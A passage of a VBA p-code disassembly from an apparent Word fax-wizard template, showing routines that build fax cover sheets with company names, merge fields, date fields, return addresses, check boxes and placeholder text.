#1088:\n' \tExitSub \n' Line #1089:\n' \tLabel FatalError \n' Line #1090:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1091:\n' \tEndSub \n' Line #1092:\n' \tQuoteRem 0x0000 0x0024 \"creates an elegant style cover sheet\"\n' Line #1093:\n' \tFuncDefn (Private Sub CreateElegCoverSheet())\n' Line #1094:\n' \tDim \n' \tVarDefn objRngBuffer1 (As Range)\n' Line #1095:\n' \tDim \n' \tVarDefn objRngBuffer2 (As Range)\n' Line #1096:\n' \tDim \n' \tVarDefn strCmpnyName (As String)\n' \tVarDefn strName (As String)\n' Line #1097:\n' \tDim \n' \tVarDefn strMFFirstName (As String)\n' \tVarDefn strMFLastName (As String)\n' \tVarDefn strMFFaxNum (As String)\n' Line #1098:\n' \tDim \n' \tVarDefn objRngTextTable (As Range)\n' Line #1099:\n' \tDim \n' \tVarDefn objTable (As Table)\n' \tVarDefn objRow (As Row)\n' Line #1100:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1101:\n' Line #1102:\n' \tOnError FatalError \n' Line #1103:\n' Line #1104:\n' \tArgsCall InsertReturnAddress 0x0000 \n' Line #1105:\n' Line #1106:\n' \tLd strMFFirstName \n' \tLd strMFLastName \n' \tLd strMFFaxNum \n' \tArgsCall GetMergeFieldNames 0x0003 \n' Line #1107:\n' Line #1108:\n' \tQuoteRem 0x0004 0x0013 \"Insert company name\"\n' Line #1109:\n' \tLd formWizard \n' \tMemLd txtCompany \n' \tMemLd Then \n' \tSt strCmpnyName \n' Line #1110:\n' \tLd strCmpnyName \n' \tFnLen \n' \tParen \n' \tIfBlock \n' Line #1111:\n' \tLd strSTY_COMPANY_NAME \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1112:\n' \tLd strCmpnyName \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1113:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1114:\n' \tEndIfBlock \n' Line #1115:\n' Line #1116:\n' \tQuoteRem 0x0004 0x000C \"Insert title\"\n' Line #1117:\n' \tLd strSTY_DOC_LABEL \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1118:\n' \tLd iFaxStyle \n' \tArgsLd rgstrFaxTitle 0x0001 \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1119:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1120:\n' Line #1121:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngTextTable \n' Line #1122:\n' Line #1123:\n' \tQuoteRem 0x0000 0x003F \"the topics To: and From: have a character style which has to be\"\n' Line #1124:\n' \tQuoteRem 0x0000 0x003E \"applied after the data has been written (since the data have a\"\n' Line #1125:\n' \tQuoteRem 0x0000 0x0028 \"different style). so, use a range buffer\"\n' Line #1126:\n' Line #1127:\n' \tQuoteRem 0x0004 0x003E \"1st line text has style \"Message Header First\". The subsequent\"\n' Line #1128:\n' \tQuoteRem 0x0004 0x001B \"lines have \"Message Header\"\"\n' Line #1129:\n' Line #1130:\n' \tQuoteRem 0x0004 0x0012 \"Insert To: & From:\"\n' Line #1131:\n' \tLd strSTY_MSG_HDR_FIRST \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1132:\n' Line #1133:\n' \tLd strTO \n' \tLd vbTab \n' \tConcat \n' \tLd strFROM \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1134:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1135:\n' \tLd strSOFT_ENTER \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1136:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1137:\n' \tQuoteRem 0x0004 0x002B \"Insert textual information in the next line\"\n' Line #1138:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tLd fDocIsFormLtr \n' \tOr \n' \tIfBlock \n' Line #1139:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFFirstName \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x004C 0x0012 \"Preserveformatting\"\n' Line #1140:\n' \tLd strMFLastName \n' \tFnLen \n' \tIfBlock \n' Line #1141:\n' \tLd strSPACE \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1142:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1143:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFLastName \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #1144:\n' \tEndIfBlock \n' Line #1145:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tEq \n' \tElseIfBlock \n' Line #1146:\n' \tLitDI2 0x0000 \n' \tArgsLd rgstrRcpntFaxNames 0x0001 \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1147:\n' \tElseBlock \n' Line #1148:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_NAME \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1149:\n' \tEndIfBlock \n' Line #1150:\n' Line #1151:\n' \tQuoteRem 0x0004 0x000B \"insert name\"\n' Line #1152:\n' \tLd formWizard \n' \tMemLd txtSenderName \n' \tMemLd Then \n' \tSt strName \n' Line #1153:\n' \tLd strName \n' \tFnLen \n' \tIfBlock \n' Line #1154:\n' \tLd vbTab \n' \tLd strName \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1155:\n' \tElseBlock \n' Line #1156:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1157:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1158:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_NAME \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1159:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1160:\n' \tEndIfBlock \n' Line #1161:\n' Line #1162:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1163:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1164:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1165:\n' Line #1166:\n' \tQuoteRem 0x0004 0x0026 \"next 3 lines in \"Message Header\" style\"\n' Line #1167:\n' \tQuoteRem 0x0004 0x0019 \"Insert FaxNumber and Date\"\n' Line #1168:\n' \tLd wdStyleMessageHeader \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1169:\n' Line #1170:\n' \tLd strFAX_NUMBER \n' \tLd vbTab \n' \tConcat \n' \tLd strDATE \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1171:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1172:\n' \tLd strSOFT_ENTER \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1173:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1174:\n' \tQuoteRem 0x0004 0x002B \"Insert textual information in the next line\"\n' Line #1175:\n' Line #1176:\n' \tQuoteRem 0x0004 0x0017 \"insert recipient number\"\n' Line #1177:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tLd fDocIsFormLtr \n' \tOr \n' \tIfBlock \n' Line #1178:\n' \tLd objActiveRange \n' \tLd wdFieldMergeField \n' \tLd strMFFaxNum \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0049 0x0012 \"Preserveformatting\"\n' Line #1179:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tEq \n' \tElseIfBlock \n' Line #1180:\n' \tLitDI2 0x0000 \n' \tArgsLd rgstrRcpntFaxNums 0x0001 \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1181:\n' \tElseBlock \n' Line #1182:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_FAX_NUMBER \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' Line #1183:\n' \tEndIfBlock \n' Line #1184:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1185:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1186:\n' Line #1187:\n' \tQuoteRem 0x0004 0x0010 \"insert datefield\"\n' Line #1188:\n' \tLd objActiveRange \n' \tLd wdFieldTime \n' \tLitStr 0x0003 \"\\@ \"\n' \tLd strQUOTE \n' \tConcat \n' \tLd strDATE_FORMAT \n' \tConcat \n' \tLd strQUOTE \n' \tConcat \n' \tLitVarSpecial (True)\n' \tArgsCall InsertField 0x0004 \n' Line #1189:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1190:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1191:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1192:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1193:\n' Line #1194:\n' \tQuoteRem 0x0004 0x001A \"Insert CompanyName & Pages\"\n' Line #1195:\n' \tLd strCOMPANY \n' \tLd vbTab \n' \tConcat \n' \tLd strTOTAL_NO_PAGES \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1196:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1197:\n' \tLd strSOFT_ENTER \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1198:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1199:\n' \tQuoteRem 0x0004 0x0013 \"Insert company name\"\n' Line #1200:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_COMPANY \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0062 0x0012 \"PreserveFormatting\"\n' Line #1201:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1202:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1203:\n' Line #1204:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_PAGES \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0060 0x0012 \"PreserveFormatting\"\n' Line #1205:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1206:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1207:\n' Line #1208:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1209:\n' Line #1210:\n' \tQuoteRem 0x0004 0x0012 \"Phone Number & Re:\"\n' Line #1211:\n' \tLd strPHONE_NUMBER \n' \tLd vbTab \n' \tConcat \n' \tLd strRE \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1212:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet objRngBuffer1 \n' Line #1213:\n' \tLd strSOFT_ENTER \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1214:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1215:\n' Line #1216:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_PHONE_NUMBER \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0067 0x0012 \"PreserveFormatting\"\n' Line #1217:\n' \tLd vbTab \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1218:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1219:\n' Line #1220:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_SUBJECT \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0062 0x0012 \"PreserveFormatting\"\n' Line #1221:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraphAfter 0x0000 \n' Line #1222:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1223:\n' Line #1224:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1225:\n' Line #1226:\n' \tQuoteRem 0x0004 0x001E \"set character style for topics\"\n' Line #1227:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd objRngBuffer1 \n' \tMemSt Style \n' Line #1228:\n' Line #1229:\n' \tQuoteRem 0x0004 0x001D \"convert the text into a table\"\n' Line #1230:\n' \tLd objActiveRange \n' \tMemLd End \n' \tLd objRngTextTable \n' \tMemSt End \n' \tQuoteRem 0x002D 0x001B \"- 1 'don't want the last CR\"\n' Line #1231:\n' \tLd objRngTextTable \n' \tArgsMemCall Set 0x0000 \n' Line #1232:\n' \tSetStmt \n' \tLd vbTab \n' \tLitDI2 0x000A \n' \tLitDI2 0x0002 \n' \tLitDI2 0x0000 \n' \tParamNamed Format$ \n' \tLd Selection \n' \tArgsMemLd ConvertToTable 0x0004 \n' \tSet objTable \n' Line #1233:\n' \tLitVarSpecial (False)\n' \tLd objTable \n' \tMemLd Borders \n' \tMemSt Enable \n' Line #1234:\n' Line #1235:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLitDI2 0x0008 \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #1236:\n' \tSetStmt \n' \tLd i \n' \tLd objTable \n' \tArgsMemLd Rows 0x0001 \n' \tSet objRow \n' Line #1237:\n' \tLitR8 0x0000 0x0000 0x0000 0x3FD0 \n' \tLitDI2 0x0048 \n' \tMul \n' \tLd objRow \n' \tMemLd Range \n' \tMemLd ParagraphFormat \n' \tMemSt LeftIndent \n' Line #1238:\n' \tQuoteRem 0x0008 0x002E \"don't need the bottom border for the last row.\"\n' Line #1239:\n' \tLd i \n' \tLitDI2 0x0008 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tLd wdBorderBottom \n' \tLd objRow \n' \tArgsMemSt Borders 0x0001 \n' \tEndIf \n' Line #1240:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1241:\n' Line #1242:\n' \tArgsCall InsertCheckBoxes 0x0000 \n' Line #1243:\n' \tArgsCall InsertBodyText 0x0000 \n' Line #1244:\n' Line #1245:\n' \tExitSub \n' Line #1246:\n' \tLabel FatalError \n' Line #1247:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1248:\n' \tEndSub \n' Line #1249:\n' Line #1250:\n' \tQuoteRem 0x0000 0x0043 \"Get the names of the merge fields to be inserted in the cover sheet\"\n' Line #1251:\n' \tQuoteRem 0x0000 0x004D \"If the original doc. is a form letter then we need to insert the merge fields\"\n' Line #1252:\n' \tQuoteRem 0x0000 0x0050 \"selected by the user. If not then insert the merge field names we created in the\"\n' Line #1253:\n' \tQuoteRem 0x0000 0x0016 \"data source we created\"\n' Line #1254:\n' \tFuncDefn (Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String))\n' Line #1255:\n' \tOnError FatalError \n' Line #1256:\n' Line #1257:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tIfBlock \n' Line #1258:\n' \tQuoteRem 0x0008 0x004C \"user selects names from drop-down of all possible mergefields in data source\"\n' Line #1259:\n' \tLd formWizard \n' \tMemLd cboFldsRcpntFirstName \n' \tMemLd Then \n' \tSt strFirstName \n' Line #1260:\n' \tLd formWizard \n' \tMemLd cboFldsRcpntLastName \n' \tMemLd Then \n' \tSt strLastName \n' Line #1261:\n' \tLd strLastName \n' \tLd strNONE \n' \tEq \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tSt strLastName \n' \tEndIf \n' Line #1262:\n' \tLd formWizard \n' \tMemLd cboFldsFaxNum \n' \tMemLd Then \n' \tSt strFaxNum \n' Line #1263:\n' \tElseBlock \n' Line #1264:\n' \tLd strFLD_FAX_NAME \n' \tSt strFirstName \n' Line #1265:\n' \tLitStr 0x0000 \"\"\n' \tSt strLastName \n' Line #1266:\n' \tLd strFLD_FAX_NUMBER \n' \tSt strFaxNum \n' Line #1267:\n' \tEndIfBlock \n' Line #1268:\n' Line #1269:\n' \tExitSub \n' Line #1270:\n' \tLabel FatalError \n' Line #1271:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1272:\n' \tEndSub \n' Line #1273:\n' \tFuncDefn (Private Sub InsertReturnAddress())\n' Line #1274:\n' \tDim \n' \tVarDefn strFromPh (As String)\n' Line #1275:\n' \tDim \n' \tVarDefn strFromFax (As String)\n' Line #1276:\n' \tDim \n' \tVarDefn strText (As String)\n' \tVarDefn strAddress (As String)\n' Line #1277:\n' Line #1278:\n' \tOnError FatalError \n' Line #1279:\n' Line #1280:\n' \tQuoteRem 0x0004 0x002B \"Set objActiveRange = ActiveDocument.Content\"\n' Line #1281:\n' \tQuoteRem 0x0004 0x004B \"If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd\"\n' Line #1282:\n' Line #1283:\n' \tLd formWizard \n' \tMemLd txtSenderPhone \n' \tMemLd Then \n' \tSt strFromPh \n' Line #1284:\n' \tLd formWizard \n' \tMemLd txtSenderFax \n' \tMemLd Then \n' \tSt strFromFax \n' Line #1285:\n' \tLd formWizard \n' \tMemLd txtMailingAddr \n' \tMemLd Then \n' \tSt strAddress \n' Line #1286:\n' Line #1287:\n' \tLd iFaxStyle \n' \tSelectCase \n' Line #1288:\n' Line #1289:\n' \tLd iSTY_CONTEMPORARY \n' \tCase \n' \tLd iSTY_PROFESSIONAL \n' \tCase \n' \tCaseDone \n' Line #1290:\n' \tLd strAddress \n' \tSt strText \n' Line #1291:\n' \tLd strText \n' \tFnLen \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1292:\n' \tLineCont 0x0004 08 00 0C 00\n' \tLd strFromPh \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd strPHONE \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFromPh \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1293:\n' Line #1294:\n' \tLineCont 0x0004 08 00 0C 00\n' \tLd strFromFax \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd strFAX \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFromFax \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1295:\n' \tLd strText \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1296:\n' \tLd iSTY_ELEGANT \n' \tCase \n' \tCaseDone \n' Line #1297:\n' \tLd strAddress \n' \tLd strSPACE \n' \tLd strBULLET \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tArgsLd StrReplaceCrLfWithText 0x0002 \n' \tSt strText \n' Line #1298:\n' \tLd strText \n' \tFnLen \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1299:\n' \tQuoteRem 0x0008 0x0018 \"if you have phone number\"\n' Line #1300:\n' \tLd strFromPh \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #1301:\n' \tLd strText \n' \tLd strPHONE \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFromPh \n' \tConcat \n' \tSt strText \n' Line #1302:\n' \tQuoteRem 0x000C 0x001A \"check if you also have fax\"\n' Line #1303:\n' \tQuoteRem 0x000C 0x0034 \"instead of vbCr use space, bullet, space combination\"\n' Line #1304:\n' \tLineCont 0x0004 08 00 10 00\n' \tLd strFromFax \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strText \n' \tLd strSPACE \n' \tConcat \n' \tLd strBULLET \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFAX \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFromFax \n' \tConcat \n' \tSt strText \n' \tEndIf \n' Line #1305:\n' \tLd strText \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' Line #1306:\n' \tQuoteRem 0x0008 0x001A \"check if you have only Fax\"\n' Line #1307:\n' \tLd strFromFax \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tElseIfBlock \n' Line #1308:\n' \tLd strText \n' \tLd strFAX \n' \tConcat \n' \tLd strSPACE \n' \tConcat \n' \tLd strFromFax \n' \tConcat \n' \tLd vbCr \n' \tConcat \n' \tSt strText \n' Line #1309:\n' \tEndIfBlock \n' Line #1310:\n' Line #1311:\n' \tEndSelect \n' Line #1312:\n' Line #1313:\n' \tLd strSTY_RETURN_ADDR \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1314:\n' \tLd strText \n' \tLd objActiveRange \n' \tArgsMemCall InsertBefore 0x0001 \n' Line #1315:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1316:\n' \tExitSub \n' Line #1317:\n' Line #1318:\n' \tLabel FatalError \n' Line #1319:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1320:\n' \tEndSub \n' Line #1321:\n' \tQuoteRem 0x0000 0x0039 \"Inserts the check-boxes and the text associated with them\"\n' Line #1322:\n' \tFuncDefn (Private Sub InsertCheckBoxes())\n' Line #1323:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1324:\n' \tDim \n' \tVarDefn R1 (As Range)\n' Line #1325:\n' \tOnError FatalError \n' Line #1326:\n' \tLd strSTY_MSG_HDR_LAST \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1327:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1328:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet R1 \n' Line #1329:\n' Line #1330:\n' \tSetStmt \n' \tLd R1 \n' \tLd strAT_UNCHKD_BOX \n' \tLd objWizTemplate \n' \tArgsMemLd AutoTextEntries 0x0001 \n' \tArgsMemLd Insert 0x0001 \n' \tSet R1 \n' Line #1331:\n' Line #1332:\n' \tLd R1 \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLd objActiveRange \n' \tMemSt End \n' Line #1333:\n' \tLd R1 \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLd objActiveRange \n' \tMemSt Start \n' Line #1334:\n' \tLd strSPACE \n' \tLitDI2 0x0001 \n' \tArgsLd rgstrChkBoxText 0x0001 \n' \tAdd \n' \tLd vbTab \n' \tAdd \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1335:\n' \tLd wdStyleEmphasis \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1336:\n' Line #1337:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1338:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLitDI2 0x0005 \n' \tFor \n' Line #1339:\n' \tLd R1 \n' \tMemLd FormattedText \n' \tLd objActiveRange \n' \tMemSt FormattedText \n' Line #1340:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1341:\n' \tLd strSPACE \n' \tLd i \n' \tArgsLd rgstrChkBoxText 0x0001 \n' \tAdd \n' \tLd vbTab \n' \tAdd \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1342:\n' \tLd wdStyleEmphasis \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1343:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1344:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1345:\n' Line #1346:\n' \tQuoteRem 0x0004 0x002E \"delete the previous character i.e the last tab\"\n' Line #1347:\n' \tLd objActiveRange \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd objActiveRange \n' \tMemSt Start \n' Line #1348:\n' \tLd objActiveRange \n' \tArgsMemCall Delete 0x0000 \n' Line #1349:\n' \tLd objActiveRange \n' \tArgsMemCall InsertParagraph 0x0000 \n' Line #1350:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1351:\n' \tExitSub \n' Line #1352:\n' Line #1353:\n' \tLabel FatalError \n' Line #1354:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1355:\n' \tEndSub \n' Line #1356:\n' Line #1357:\n' \tFuncDefn (Private Sub InsertBodyText())\n' Line #1358:\n' \tDim \n' \tVarDefn R1 (As Range)\n' Line #1359:\n' \tDim \n' \tVarDefn strAfterText (As String)\n' Line #1360:\n' \tOnError FatalError \n' Line #1361:\n' Line #1362:\n' \tLd iFaxStyle \n' \tLd iSTY_ELEGANT \n' \tEq \n' \tIfBlock \n' Line #1363:\n' \tLd vbCr \n' \tSt strAfterText \n' Line #1364:\n' \tElseBlock \n' Line #1365:\n' \tLd strSPACE \n' \tLd strSPACE \n' \tConcat \n' \tSt strAfterText \n' Line #1366:\n' \tEndIfBlock \n' Line #1367:\n' Line #1368:\n' Line #1369:\n' \tLineCont 0x0004 05 00 08 00\n' \tLd iFaxStyle \n' \tLd iSTY_PROFESSIONAL \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd strBULLET \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' \tEndIf \n' Line #1370:\n' Line #1371:\n' \tLd iFaxStyle \n' \tArgsLd rgstrNotes 0x0001 \n' \tLd strAfterText \n' \tConcat \n' \tLd objActiveRange \n' \tArgsMemCall InsertAfter 0x0001 \n' Line #1372:\n' Line #1373:\n' \tSetStmt \n' \tLd objActiveRange \n' \tMemLd Duplicate \n' \tSet R1 \n' Line #1374:\n' \tLd wdCollapseEnd \n' \tLd objActiveRange \n' \tArgsMemCall Collapse 0x0001 \n' Line #1375:\n' Line #1376:\n' \tLd objActiveRange \n' \tLd wdFieldMacroButton \n' \tLd strEMPTY_MACRO \n' \tLd strCLICK_HERE_COMMENTS \n' \tConcat \n' \tLitVarSpecial (False)\n' \tArgsCall InsertField 0x0004 \n' \tQuoteRem 0x0063 0x0012 \"PreserveFormatting\"\n' Line #1377:\n' \tLd wdStyleBodyText \n' \tLd objActiveRange \n' \tMemSt Style \n' Line #1378:\n' \tLd strSTY_MSG_HDR_LABEL \n' \tLd R1 \n' \tMemSt Style \n' Line #1379:\n' Line #1380:\n' \tExitSub \n' Line #1381:\n' \tLabel FatalError \n' Line #1382:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1383:\n' \tEndSub \n' Line #1384:\n' \tFuncDefn (Private Sub InsertContAutoText())\n' Line #1385:\n' Line #1386:\n' \tOnError FatalError \n' Line #1387:\n' \tSetStmt \n' \tLd objActiveRange \n' \tLitVarSpecial (True)\n' \tLd strCNTMPGFX2 \n' \tLd objWizTemplate \n' \tArgsMemLd AutoTextEntries 